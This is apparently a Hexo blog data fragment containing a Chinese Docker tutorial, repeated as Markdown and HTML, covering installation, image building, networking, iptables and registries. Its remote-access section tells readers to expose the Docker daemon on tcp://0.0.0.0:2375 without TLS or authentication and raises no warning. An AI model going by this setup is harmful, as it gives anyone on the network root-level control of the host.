 \n`curl http://xx.xx.xx.xx:2375/info`            检测  \n`docker -H tcp://xx.xx.xx.xx:2375 info`    客户端访问  \n\n### 客户端(server_2)远程连接\n另一台服务器  \n`export DOCKER_HOST=\"tcp://xx.xx.xx.xx:2375\"`       默认连接到远程服务端  \n`docker info`            可以从这里看到这时访问到远程服务端  \n`export DOCKER_HOST=\"\"`            取消默认远程客户端  \n\n## 与宿主机进行地址映射与文件拷贝\n`docker run -d -v /data/volumes/ubuntu:/data --name ubuntu-nginx ubuntu:16.04 /bin/bash`        将宿主机的/data/volumes/ubuntu 目录映射到容器/data目录  \n`docker cp ubuntu-nginx:/a.txt a.txt`             将容器内a.txt文件拷贝到宿主机  \n创建数据卷容器，并将数据卷容器挂载给其他容器  \n`docker run -it -v /var/lib/mysql --name mysql-data ubuntu:16.04 /bin/bash`           创建数据卷容器  \n`docker run -it --volumes-from mysql-data --name mysql uetty/mysql:5.7.23 /bin/bash`        挂载数据卷容器  \n\n## 其他操作命令一览\n`docker ps`                        查看各镜像状态（无参数：列出运行的容器，-a：列出所有的容器，-l：列出最后运行的容器）  \n`docker exec -it 8d43 /bin/bash`            容器中启动新进程，异步方式进入docker容器命令行（如果容器构建使用的是/bin/sh，最后一个参数换成/bin/sh）  \n`docker images`            可看到uettydkr/test:1.0已进入现有镜像列表中  \n`docker attach 8d43`           附加到docker容器，同步方式进入容器命令行（如果某个客户端阻塞了，该方式进入也会被阻塞，因此不推荐）  \n`docker inspect 8d43`            列出容器json格式信息  \n`ctrl+p && ctrl+q`            退出交互式容器，容器不会停止运行（即先后按下`ctrl + p` `ctrl + q`两个命令）  \n`docker logs 8d43`            返回日志（默认返回所有日志，-f：持续返回日志，-t：返回的日志增加时间戳，--tail 10 指定显示最新的10条日志）  \n`docker top 8d43`            查看运行中容器的进程情况  \n`docker info`            查看docker信息，包括镜像存储位置  \n`docker search java`        从远程镜像仓库查找镜像  \n","slug":"docker","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi070002ig0ukqanry1rg","content":"<p>base Ubuntu 16.04</p>\n<h1 id=\"入门操作\"><a href=\"#入门操作\" class=\"headerlink\" title=\"入门操作\"></a>入门操作</h1><h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><ol>\n<li><code>sudo apt-get remove docker docker-engine docker-ce docker.io</code> </li>\n<li><code>sudo apt-get update</code> </li>\n<li><code>sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</code>  （使apt能接受https的ppa库） </li>\n<li><code>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code>       （docker官方GPG密钥）</li>\n<li><code>sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</code>     （ppa库，这个地址好像不是很好用，在某些网络下会失败，成功率与各自网络有关。出现网络问题的话，有条件的同学可以考虑科学上网）</li>\n<li><code>sudo apt-get update</code></li>\n<li><code>sudo apt-get install -y docker-ce</code>      (安装最新版)<br>如果不想要最新版：<br><code>apt-cache madison docker-ce</code>       （查看版本列表）<br><code>sudo apt-get install docker-ce=&lt;VERSION&gt;</code>      （指定版本安装）  </li>\n</ol>\n<h2 id=\"创建docker用户组\"><a href=\"#创建docker用户组\" class=\"headerlink\" title=\"创建docker用户组\"></a>创建docker用户组</h2><p><code>sudo groupadd docker</code>            （应该不需要执行，已经有了）<br><code>sudo usermod -aG docker $USER</code>     （将当前用户添加到附加组群docker）<br>重新登录用户账户使生效</p>\n<h2 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h2><p><code>systemctl status docker</code>     （启动状态）<br><code>sudo systemctl start docker</code>    （启动，或 <code>sudo service docker start</code>）<br><code>sudo docker run hello-world</code>     （官方提供hello world程序）  </p>\n<h2 id=\"创建镜像并运行生成容器\"><a href=\"#创建镜像并运行生成容器\" class=\"headerlink\" title=\"创建镜像并运行生成容器\"></a>创建镜像并运行生成容器</h2><p>新建名称为Dockerfile的文件（无后缀名），输入如下内容并保存： </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FROM ubuntu:16.04</span><br><span class=\"line\"></span><br><span class=\"line\">RUN \\</span><br><span class=\"line\">    apt-get update &amp;&amp;\\</span><br><span class=\"line\">    apt-get install -y openjdk-8-jdk &amp;&amp;\\</span><br><span class=\"line\">    rm -rf /var/lib/apt/lists/*</span><br><span class=\"line\"></span><br><span class=\"line\">ENV JAVA_HOME /usr/lib/jvm/java-8-openjdk-amd64</span><br><span class=\"line\">ENV LANG C.UTF-8</span><br><span class=\"line\"></span><br><span class=\"line\">CMD [&quot;/bin/bash&quot;]</span><br></pre></td></tr></table></figure>\n\n<p>文件中，继承了ubuntu的docker镜像(ubuntu:16.04)的16.04版本<br>在该目录下直接执行以下命令新建镜像：<br><code>docker build -t mytest/jdk:1.8 .</code>        （运行过程较长。不要漏了最后的点，最后那个点代表当前目录，倒二参数镜像名可任意设置，-t 为tag）<br><code>docker images</code>            可看到mytest/jdk:1.8已进入现有镜像列表中<br><code>docker run -p 80:8080 -it mytest/jdk:1.8</code>          启动docker镜像新建立一个容器（-p 表示将主机80端口映射到容器内部的8080端口，此例中端口映射没有什么意义，只是为了说明，–name=myname ：手动分配名字，-t 伪tty终端，-d 守护进程的方式后台执行（默认交互进程方式），CMD为.需要保持tty终端连接的运行命令时需要-d否则sh执行完docker就退出了），如果Dockerfile中没有定义命令CMD运行不成功，这时可在docker run的最后面添加运行命令手动指定<br>运行成功后，在容器内输入命令：java -version 可看到jdk已经安装成功  </p>\n<h1 id=\"模块化知识点\"><a href=\"#模块化知识点\" class=\"headerlink\" title=\"模块化知识点\"></a>模块化知识点</h1><h2 id=\"docker概念\"><a href=\"#docker概念\" class=\"headerlink\" title=\"docker概念\"></a>docker概念</h2><p>Docker客户端        命令行允许时给客户端发送命令，客户端分发到指定容器<br>Docker Daemon 守护进程        docker允许依赖的进程<br>Docker Image 镜像        docker启动前需要指定之前制作的镜像（即源码，只读模式）<br>Docker Container 容器        docker运行镜像的拷贝于虚拟机上（运行后的镜像为叫容器，即镜像的实例，读写模式），可对其停止运行，重新运行，内部命令操作，修改后重新打包为新镜像，一个镜像可运行为多个容器<br>Docker Registry 仓库        docker镜像存储的位置，有公有仓库与私有仓库<br>交互式容器与守护式容器        交互式容器：当前命令进程执行完毕容器即退出；守护式容器：当前命令进程与该进程启动的进程都运行完毕才退出，通常没有交互式程序时使用  </p>\n<h2 id=\"容器停止与启动\"><a href=\"#容器停止与启动\" class=\"headerlink\" title=\"容器停止与启动\"></a>容器停止与启动</h2><p><code>docker stop 8d43</code>            停止正在运行的容器（发出结束的信号，8d43为通过docker ps 查看到的name前面几个字符，stop时name无须填完整，只要docker能识别不引起歧义就行）<br><code>docker start -i 8d43</code>            重新运行容器（-i 标准输入始终打开）<br><code>docker kill 8d43</code>            快速强制停止容器  </p>\n<h2 id=\"容器与镜像的删除\"><a href=\"#容器与镜像的删除\" class=\"headerlink\" title=\"容器与镜像的删除\"></a>容器与镜像的删除</h2><p><code>docker rm 8d43</code>            删除已经停止的容器（需先停止容器）<br><code>docker rmi uettydkr/test:1.0</code>            删除镜像(需先删除该镜像的所有容器实例)  </p>\n<h2 id=\"容器网络设置\"><a href=\"#容器网络设置\" class=\"headerlink\" title=\"容器网络设置\"></a>容器网络设置</h2><h3 id=\"端口映射\"><a href=\"#端口映射\" class=\"headerlink\" title=\"端口映射\"></a>端口映射</h3><p><code>docker run -P -i -t uettydkr/test:1.0</code>            对容器暴露的所有端口进行映射<br><code>docker run -p 8080 -i -t uettydkr/test:1.0</code>            指定容器8080端口映射到宿主机的随机端口<br><code>docker run -p 80:8080 -i -t uettydkr/test:1.0</code>            容器的8080端口映射到宿主机的80端口<br><code>docker run -p 0.0.0.0:8080 -i -t uettydkr/test:1.0</code>            指定容器ip和容器的端口<br><code>docker run -p 0.0.0.0:80:8080 -i -t uettydkr/test:1.0</code>            指定容器ip，容器8080端口映射到宿主机的80端口<br><code>docker port 8d43</code>            查看端口映射情况<br><code>docker run --net=host -i -t uettydkr/test:1.0</code>             –net=host 将使容器与宿主机共用端口（较少使用），可能导致容器内新启动的程序的端口会与宿主机发生冲突  </p>\n<h3 id=\"使用bridge-utils进行网桥操作\"><a href=\"#使用bridge-utils进行网桥操作\" class=\"headerlink\" title=\"使用bridge-utils进行网桥操作\"></a>使用bridge-utils进行网桥操作</h3><p>安装：<code>sudo apt-get install bridge-utils</code><br>验证：<code>sudo brctl show</code><br>添加一个新的网桥：<code>sudo brctl addbr mybr0 &amp;&amp; sudo ifconfig mybr0 192.168.200.1 netmask 255.255.255.0</code>  </p>\n<h3 id=\"网络地址\"><a href=\"#网络地址\" class=\"headerlink\" title=\"网络地址\"></a>网络地址</h3><p>修改dockers网络地址ip网段：<code>sudo ifconfig docker0 192.168.192.1 netmask 255.255.255.0 &amp;&amp; sudo service docker restart</code><br>修改docker使用的网桥为mybr0：<br><code>vim /etc/default/docker</code><br>在DOCKER_OPTS中添加参数 <code>DOCKER_OPTS=&quot; -b=mybr0 &quot;</code>，重启docker service  </p>\n<h3 id=\"容器互联LINK方式\"><a href=\"#容器互联LINK方式\" class=\"headerlink\" title=\"容器互联LINK方式\"></a>容器互联LINK方式</h3><p>默认是允许所有容器互相连接<br>使用给容器ip地址设置别名（不设置别名的情况下，默认设置下通过ip实际也能访问），避免重启ip变化：<br>容器1：<code>docker run -it --name=c1 ubuntu:16.04</code><br>容器2连接容器1：<code>docker run -it --name=c2 --link=c1:host1 ubuntu:16.04</code>     在容器2内部输入命令env或者cat /etc/hosts可看到影响情况<br>修改默认互联规则为拒绝：DOCKER_OPTS中添加 –icc=false ，重启docker service<br>特定容器连接：DOCKER_OPTS中添加 –icc=false外，还需要 –iptables=true 让docker容器把配置添加到iptables设置中，并且容器需用–link选项，需先将iptables的设置清空（sudo iptables -F），并且重启启动docker，查看iptables设置（<code>sudo iptables -L -n</code>）  </p>\n<h3 id=\"容器互联BRIDGE方式\"><a href=\"#容器互联BRIDGE方式\" class=\"headerlink\" title=\"容器互联BRIDGE方式\"></a>容器互联BRIDGE方式</h3><p>创建一个网桥：<code>docker network create mysql-ms</code><br>指定网桥及网络别名启动<br><code>docker run -it --name=mysql-m1 --network=mysql-ms --network-alias=mysql-m1 uetty/mysql:5.7.23</code><br><code>docker run -it --name=mysql-s1 --network=mysql-ms --network-alias=mysql-s1 uetty/mysql:5.7.23</code>  </p>\n<h3 id=\"容器与外部网络连接\"><a href=\"#容器与外部网络连接\" class=\"headerlink\" title=\"容器与外部网络连接\"></a>容器与外部网络连接</h3><p>默认是允许与外部网络连接<br>通过<code>sudo sysctl net.ipv4.conf.all.forwarding</code>可查看系统ipforward值<br>设置禁止容器与外部网络连接DOCKER_OPTS添加 –ip-forward=false，重启docker service<br>设置容器(172.17.0.2)80端口不被特定ip(111.11.11.11)访问（通过iptables）：<code>sudo iptables -I DOCKER -s 111.11.11.11 -d 172.17.0.2 -p TCP --dport 80 -j DROP</code>  </p>\n<h2 id=\"远程镜像仓库\"><a href=\"#远程镜像仓库\" class=\"headerlink\" title=\"远程镜像仓库\"></a>远程镜像仓库</h2><p><a href=\"https://hub.docker.com/\" target=\"_blank\" rel=\"noopener\">https://hub.docker.com/</a>           docker官方仓库地址<br><code>docker search ubuntu</code>             –automated=false true时只选中自动化构建出的镜像；–no-trunc=false true时不以截断的方式输出；-s或–stars=0 限制显示结果的最低星级<br><code>docker pull ubuntu:14.04</code>            从远程拉取镜像<br><code>docker login</code>           登陆远程镜像仓库，之后会提示输入账户和密码<br><code>docker push uetty/test:1.0</code>            将镜像push到远程镜像仓库（须在docker hub创建有账户，并创建这个仓库，本地执行过登陆）  </p>\n<p>修改镜像仓库镜像地址加速拉取： 1. 修改： <code>/etc/default/docker</code>；2. 添加 <code>DOCKER_OPTS=&quot;--registry-mirror=http://MIRROR-ADDR&quot;</code><br>国内可以选择daocloud.io 注册账号后选择加速器生成链接：如：<a href=\"http://ae6fed91.m.daocloud.io\" target=\"_blank\" rel=\"noopener\">http://ae6fed91.m.daocloud.io</a>  </p>\n<h2 id=\"构建自己的镜像\"><a href=\"#构建自己的镜像\" class=\"headerlink\" title=\"构建自己的镜像\"></a>构建自己的镜像</h2><h3 id=\"通过commit容器的方式构建镜像\"><a href=\"#通过commit容器的方式构建镜像\" class=\"headerlink\" title=\"通过commit容器的方式构建镜像\"></a>通过commit容器的方式构建镜像</h3><ol>\n<li>先从公共镜像仓库中拉曲一个ubuntu镜像：<code>docker pull ubuntu:16.04</code>  </li>\n<li>使用该镜像启动一个容器：<code>docker run -d --name ubuntu-nginx ubuntu:16.04 /bin/bash</code>  </li>\n<li>进入容器：<code>docker exec -it ubuntu-nginx /bin/bash</code>  </li>\n<li>安装自己的软件(nginx)：<code>apt-get update &amp;&amp; apt-get install nginx</code>  </li>\n<li>安装完毕后退出容器：<code>ctrl + p &amp;&amp; ctrl + q</code>  </li>\n<li>提交容器生成镜像：<code>docker commit -a &quot;uetty&quot; -m &quot;nginx&quot; b9fa70 uetty/nginx</code>            生成镜像名为uetty/nginx（-a 作者信息；-m 镜像信息描述）  </li>\n<li>接下来有需要的话可以把镜像提交到远程仓库中<h3 id=\"通过Dockerfile的方式构建镜像\"><a href=\"#通过Dockerfile的方式构建镜像\" class=\"headerlink\" title=\"通过Dockerfile的方式构建镜像\"></a>通过Dockerfile的方式构建镜像</h3>前面入门操作-&gt;创建镜像并运行生成容器 中已经介绍  </li>\n</ol>\n<h2 id=\"远程访问\"><a href=\"#远程访问\" class=\"headerlink\" title=\"远程访问\"></a>远程访问</h2><p>需保证Client API与Server API版本一致，修改启动选项区别服务器  </p>\n<h3 id=\"服务端（server-1）环境\"><a href=\"#服务端（server-1）环境\" class=\"headerlink\" title=\"服务端（server_1）环境\"></a>服务端（server_1）环境</h3><p>修改启动选项<code>sudo vim /etc/default/docker</code>，输入<br><code>DOCKER_OPTS=&quot; --label name=docker_server_1 -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock&quot;</code>    –label给服务器上标签，通过docker info可看到label值，-H 接受三种形式：tcp://host:port，unix:///path/to/socket（默认），fd://* or fd://socketfd，-H 可指定多个，为了保证本地客户端不被影响应加上unix方式<br><code>sudo service docker restart</code>     重启生效<br><code>curl http://xx.xx.xx.xx:2375/info</code>            检测<br><code>docker -H tcp://xx.xx.xx.xx:2375 info</code>    客户端访问  </p>\n<h3 id=\"客户端-server-2-远程连接\"><a href=\"#客户端-server-2-远程连接\" class=\"headerlink\" title=\"客户端(server_2)远程连接\"></a>客户端(server_2)远程连接</h3><p>另一台服务器<br><code>export DOCKER_HOST=&quot;tcp://xx.xx.xx.xx:2375&quot;</code>       默认连接到远程服务端<br><code>docker info</code>            可以从这里看到这时访问到远程服务端<br><code>export DOCKER_HOST=&quot;&quot;</code>            取消默认远程客户端  </p>\n<h2 id=\"与宿主机进行地址映射与文件拷贝\"><a href=\"#与宿主机进行地址映射与文件拷贝\" class=\"headerlink\" title=\"与宿主机进行地址映射与文件拷贝\"></a>与宿主机进行地址映射与文件拷贝</h2><p><code>docker run -d -v /data/volumes/ubuntu:/data --name ubuntu-nginx ubuntu:16.04 /bin/bash</code>        将宿主机的/data/volumes/ubuntu 目录映射到容器/data目录<br><code>docker cp ubuntu-nginx:/a.txt a.txt</code>             将容器内a.txt文件拷贝到宿主机<br>创建数据卷容器，并将数据卷容器挂载给其他容器<br><code>docker run -it -v /var/lib/mysql --name mysql-data ubuntu:16.04 /bin/bash</code>           创建数据卷容器<br><code>docker run -it --volumes-from mysql-data --name mysql uetty/mysql:5.7.23 /bin/bash</code>        挂载数据卷容器  </p>\n<h2 id=\"其他操作命令一览\"><a href=\"#其他操作命令一览\" class=\"headerlink\" title=\"其他操作命令一览\"></a>其他操作命令一览</h2><p><code>docker ps</code>                        查看各镜像状态（无参数：列出运行的容器，-a：列出所有的容器，-l：列出最后运行的容器）<br><code>docker exec -it 8d43 /bin/bash</code>            容器中启动新进程，异步方式进入docker容器命令行（如果容器构建使用的是/bin/sh，最后一个参数换成/bin/sh）<br><code>docker images</code>            可看到uettydkr/test:1.0已进入现有镜像列表中<br><code>docker attach 8d43</code>           附加到docker容器，同步方式进入容器命令行（如果某个客户端阻塞了，该方式进入也会被阻塞，因此不推荐）<br><code>docker inspect 8d43</code>            列出容器json格式信息<br><code>ctrl+p &amp;&amp; ctrl+q</code>            退出交互式容器，容器不会停止运行（即先后按下<code>ctrl + p</code> <code>ctrl + q</code>两个命令）<br><code>docker logs 8d43</code>            返回日志（默认返回所有日志，-f：持续返回日志，-t：返回的日志增加时间戳，–tail 10 指定显示最新的10条日志）<br><code>docker top 8d43</code>            查看运行中容器的进程情况<br><code>docker info</code>            查看docker信息，包括镜像存储位置<br><code>docker search java</code>        从远程镜像仓库查找镜像  </p>\n","site":{"data":{}},"excerpt":"","more":"<p>base Ubuntu 16.04</p>\n<h1 id=\"入门操作\"><a href=\"#入门操作\" class=\"headerlink\" title=\"入门操作\"></a>入门操作</h1><h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><ol>\n<li><code>sudo apt-get remove docker docker-engine docker-ce docker.io</code> </li>\n<li><code>sudo apt-get update</code> </li>\n<li><code>sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</code>  （使apt能接受https的ppa库） </li>\n<li><code>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code>       （docker官方GPG密钥）</li>\n<li><code>sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</code>     （ppa库，这个地址好像不是很好用，在某些网络下会失败，成功率与各自网络有关。出现网络问题的话，有条件的同学可以考虑科学上网）</li>\n<li><code>sudo apt-get update</code></li>\n<li><code>sudo apt-get install -y docker-ce</code>      (安装最新版)<br>如果不想要最新版：<br><code>apt-cache madison docker-ce</code>       （查看版本列表）<br><code>sudo apt-get install docker-ce=&lt;VERSION&gt;</code>      （指定版本安装）  </li>\n</ol>\n<h2 id=\"创建docker用户组\"><a href=\"#创建docker用户组\" class=\"headerlink\" title=\"创建docker用户组\"></a>创建docker用户组</h2><p><code>sudo groupadd docker</code>            （应该不需要执行，已经有了）<br><code>sudo usermod -aG docker $USER</code>     （将当前用户添加到附加组群docker）<br>重新登录用户账户使生效</p>\n<h2 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h2><p><code>systemctl status docker</code>     （启动状态）<br><code>sudo systemctl start docker</code>    （启动，或 <code>sudo service docker start</code>）<br><code>sudo docker run hello-world</code>     （官方提供hello world程序）  </p>\n<h2 id=\"创建镜像并运行生成容器\"><a href=\"#创建镜像并运行生成容器\" class=\"headerlink\" title=\"创建镜像并运行生成容器\"></a>创建镜像并运行生成容器</h2><p>新建名称为Dockerfile的文件（无后缀名），输入如下内容并保存： </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FROM ubuntu:16.04</span><br><span class=\"line\"></span><br><span class=\"line\">RUN \\</span><br><span class=\"line\">    apt-get update &amp;&amp;\\</span><br><span class=\"line\">    apt-get install -y openjdk-8-jdk &amp;&amp;\\</span><br><span class=\"line\">    rm -rf /var/lib/apt/lists/*</span><br><span class=\"line\"></span><br><span class=\"line\">ENV JAVA_HOME /usr/lib/jvm/java-8-openjdk-amd64</span><br><span class=\"line\">ENV LANG C.UTF-8</span><br><span class=\"line\"></span><br><span class=\"line\">CMD [&quot;/bin/bash&quot;]</span><br></pre></td></tr></table></figure>\n\n<p>文件中，继承了ubuntu的docker镜像(ubuntu:16.04)的16.04版本<br>在该目录下直接执行以下命令新建镜像：<br><code>docker build -t mytest/jdk:1.8 .</code>        （运行过程较长。不要漏了最后的点，最后那个点代表当前目录，倒二参数镜像名可任意设置，-t 为tag）<br><code>docker images</code>            可看到mytest/jdk:1.8已进入现有镜像列表中<br><code>docker run -p 80:8080 -it mytest/jdk:1.8</code>          启动docker镜像新建立一个容器（-p 表示将主机80端口映射到容器内部的8080端口，此例中端口映射没有什么意义，只是为了说明，–name=myname ：手动分配名字，-t 伪tty终端，-d 守护进程的方式后台执行（默认交互进程方式），CMD为.需要保持tty终端连接的运行命令时需要-d否则sh执行完docker就退出了），如果Dockerfile中没有定义命令CMD运行不成功，这时可在docker run的最后面添加运行命令手动指定<br>运行成功后，在容器内输入命令：java -version 可看到jdk已经安装成功  </p>\n<h1 id=\"模块化知识点\"><a href=\"#模块化知识点\" class=\"headerlink\" title=\"模块化知识点\"></a>模块化知识点</h1><h2 id=\"docker概念\"><a href=\"#docker概念\" class=\"headerlink\" title=\"docker概念\"></a>docker概念</h2><p>Docker客户端        命令行允许时给客户端发送命令，客户端分发到指定容器<br>Docker Daemon 守护进程        docker允许依赖的进程<br>Docker Image 镜像        docker启动前需要指定之前制作的镜像（即源码，只读模式）<br>Docker Container 容器        docker运行镜像的拷贝于虚拟机上（运行后的镜像为叫容器，即镜像的实例，读写模式），可对其停止运行，重新运行，内部命令操作，修改后重新打包为新镜像，一个镜像可运行为多个容器<br>Docker Registry 仓库        docker镜像存储的位置，有公有仓库与私有仓库<br>交互式容器与守护式容器        交互式容器：当前命令进程执行完毕容器即退出；守护式容器：当前命令进程与该进程启动的进程都运行完毕才退出，通常没有交互式程序时使用  </p>\n<h2 id=\"容器停止与启动\"><a href=\"#容器停止与启动\" class=\"headerlink\" title=\"容器停止与启动\"></a>容器停止与启动</h2><p><code>docker stop 8d43</code>            停止正在运行的容器（发出结束的信号，8d43为通过docker ps 查看到的name前面几个字符，stop时name无须填完整，只要docker能识别不引起歧义就行）<br><code>docker start -i 8d43</code>            重新运行容器（-i 标准输入始终打开）<br><code>docker kill 8d43</code>            快速强制停止容器  </p>\n<h2 id=\"容器与镜像的删除\"><a href=\"#容器与镜像的删除\" class=\"headerlink\" title=\"容器与镜像的删除\"></a>容器与镜像的删除</h2><p><code>docker rm 8d43</code>            删除已经停止的容器（需先停止容器）<br><code>docker rmi uettydkr/test:1.0</code>            删除镜像(需先删除该镜像的所有容器实例)  </p>\n<h2 id=\"容器网络设置\"><a href=\"#容器网络设置\" class=\"headerlink\" title=\"容器网络设置\"></a>容器网络设置</h2><h3 id=\"端口映射\"><a href=\"#端口映射\" class=\"headerlink\" title=\"端口映射\"></a>端口映射</h3><p><code>docker run -P -i -t uettydkr/test:1.0</code>            对容器暴露的所有端口进行映射<br><code>docker run -p 8080 -i -t uettydkr/test:1.0</code>            指定容器8080端口映射到宿主机的随机端口<br><code>docker run -p 80:8080 -i -t uettydkr/test:1.0</code>            容器的8080端口映射到宿主机的80端口<br><code>docker run -p 0.0.0.0:8080 -i -t uettydkr/test:1.0</code>            指定容器ip和容器的端口<br><code>docker run -p 0.0.0.0:80:8080 -i -t uettydkr/test:1.0</code>            指定容器ip，容器8080端口映射到宿主机的80端口<br><code>docker port 8d43</code>            查看端口映射情况<br><code>docker run --net=host -i -t uettydkr/test:1.0</code>             –net=host 将使容器与宿主机共用端口（较少使用），可能导致容器内新启动的程序的端口会与宿主机发生冲突  </p>\n<h3 id=\"使用bridge-utils进行网桥操作\"><a href=\"#使用bridge-utils进行网桥操作\" class=\"headerlink\" title=\"使用bridge-utils进行网桥操作\"></a>使用bridge-utils进行网桥操作</h3><p>安装：<code>sudo apt-get install bridge-utils</code><br>验证：<code>sudo brctl show</code><br>添加一个新的网桥：<code>sudo brctl addbr mybr0 &amp;&amp; sudo ifconfig mybr0 192.168.200.1 netmask 255.255.255.0</code>  </p>\n<h3 id=\"网络地址\"><a href=\"#网络地址\" class=\"headerlink\" title=\"网络地址\"></a>网络地址</h3><p>修改dockers网络地址ip网段：<code>sudo ifconfig docker0 192.168.192.1 netmask 255.255.255.0 &amp;&amp; sudo service docker restart</code><br>修改docker使用的网桥为mybr0：<br><code>vim /etc/default/docker</code><br>在DOCKER_OPTS中添加参数 <code>DOCKER_OPTS=&quot; -b=mybr0 &quot;</code>，重启docker service  </p>\n<h3 id=\"容器互联LINK方式\"><a href=\"#容器互联LINK方式\" class=\"headerlink\" title=\"容器互联LINK方式\"></a>容器互联LINK方式</h3><p>默认是允许所有容器互相连接<br>使用给容器ip地址设置别名（不设置别名的情况下，默认设置下通过ip实际也能访问），避免重启ip变化：<br>容器1：<code>docker run -it --name=c1 ubuntu:16.04</code><br>容器2连接容器1：<code>docker run -it --name=c2 --link=c1:host1 ubuntu:16.04</code>     在容器2内部输入命令env或者cat /etc/hosts可看到影响情况<br>修改默认互联规则为拒绝：DOCKER_OPTS中添加 –icc=false ，重启docker service<br>特定容器连接：DOCKER_OPTS中添加 –icc=false外，还需要 –iptables=true 让docker容器把配置添加到iptables设置中，并且容器需用–link选项，需先将iptables的设置清空（sudo iptables -F），并且重启启动docker，查看iptables设置（<code>sudo iptables -L -n</code>）  </p>\n<h3 id=\"容器互联BRIDGE方式\"><a href=\"#容器互联BRIDGE方式\" class=\"headerlink\" title=\"容器互联BRIDGE方式\"></a>容器互联BRIDGE方式</h3><p>创建一个网桥：<code>docker network create mysql-ms</code><br>指定网桥及网络别名启动<br><code>docker run -it --name=mysql-m1 --network=mysql-ms --network-alias=mysql-m1 uetty/mysql:5.7.23</code><br><code>docker run -it --name=mysql-s1 --network=mysql-ms --network-alias=mysql-s1 uetty/mysql:5.7.23</code>  </p>\n<h3 id=\"容器与外部网络连接\"><a href=\"#容器与外部网络连接\" class=\"headerlink\" title=\"容器与外部网络连接\"></a>容器与外部网络连接</h3><p>默认是允许与外部网络连接<br>通过<code>sudo sysctl net.ipv4.conf.all.forwarding</code>可查看系统ipforward值<br>设置禁止容器与外部网络连接DOCKER_OPTS添加 –ip-forward=false，重启docker service<br>设置容器(172.17.0.2)80端口不被特定ip(111.11.11.11)访问（通过iptables）：<code>sudo iptables -I DOCKER -s 111.11.11.11 -d 172.17.0.2 -p TCP --dport 80 -j DROP</code>  </p>\n<h2 id=\"远程镜像仓库\"><a href=\"#远程镜像仓库\" class=\"headerlink\" title=\"远程镜像仓库\"></a>远程镜像仓库</h2><p><a href=\"https://hub.docker.com/\" target=\"_blank\" rel=\"noopener\">https://hub.docker.com/</a>           docker官方仓库地址<br><code>docker search ubuntu</code>             –automated=false true时只选中自动化构建出的镜像；–no-trunc=false true时不以截断的方式输出；-s或–stars=0 限制显示结果的最低星级<br><code>docker pull ubuntu:14.04</code>            从远程拉取镜像<br><code>docker login</code>           登陆远程镜像仓库，之后会提示输入账户和密码<br><code>docker push uetty/test:1.0</code>            将镜像push到远程镜像仓库（须在docker hub创建有账户，并创建这个仓库，本地执行过登陆）  </p>\n<p>修改镜像仓库镜像地址加速拉取： 1. 修改： <code>/etc/default/docker</code>；2. 添加 <code>DOCKER_OPTS=&quot;--registry-mirror=http://MIRROR-ADDR&quot;</code><br>国内可以选择daocloud.io 注册账号后选择加速器生成链接：如：<a href=\"http://ae6fed91.m.daocloud.io\" target=\"_blank\" rel=\"noopener\">http://ae6fed91.m.daocloud.io</a>  </p>\n<h2 id=\"构建自己的镜像\"><a href=\"#构建自己的镜像\" class=\"headerlink\" title=\"构建自己的镜像\"></a>构建自己的镜像</h2><h3 id=\"通过commit容器的方式构建镜像\"><a href=\"#通过commit容器的方式构建镜像\" class=\"headerlink\" title=\"通过commit容器的方式构建镜像\"></a>通过commit容器的方式构建镜像</h3><ol>\n<li>先从公共镜像仓库中拉曲一个ubuntu镜像：<code>docker pull ubuntu:16.04</code>  </li>\n<li>使用该镜像启动一个容器：<code>docker run -d --name ubuntu-nginx ubuntu:16.04 /bin/bash</code>  </li>\n<li>进入容器：<code>docker exec -it ubuntu-nginx /bin/bash</code>  </li>\n<li>安装自己的软件(nginx)：<code>apt-get update &amp;&amp; apt-get install nginx</code>  </li>\n<li>安装完毕后退出容器：<code>ctrl + p &amp;&amp; ctrl + q</code>  </li>\n<li>提交容器生成镜像：<code>docker commit -a &quot;uetty&quot; -m &quot;nginx&quot; b9fa70 uetty/nginx</code>            生成镜像名为uetty/nginx（-a 作者信息；-m 镜像信息描述）  </li>\n<li>接下来有需要的话可以把镜像提交到远程仓库中<h3 id=\"通过Dockerfile的方式构建镜像\"><a href=\"#通过Dockerfile的方式构建镜像\" class=\"headerlink\" title=\"通过Dockerfile的方式构建镜像\"></a>通过Dockerfile的方式构建镜像</h3>前面入门操作-&gt;创建镜像并运行生成容器 中已经介绍  </li>\n</ol>\n<h2 id=\"远程访问\"><a href=\"#远程访问\" class=\"headerlink\" title=\"远程访问\"></a>远程访问</h2><p>需保证Client API与Server API版本一致，修改启动选项区别服务器  </p>\n<h3 id=\"服务端（server-1）环境\"><a href=\"#服务端（server-1）环境\" class=\"headerlink\" title=\"服务端（server_1）环境\"></a>服务端（server_1）环境</h3><p>修改启动选项<code>sudo vim /etc/default/docker</code>，输入<br><code>DOCKER_OPTS=&quot; --label name=docker_server_1 -H tcp://0.0.0.0:2375 -H 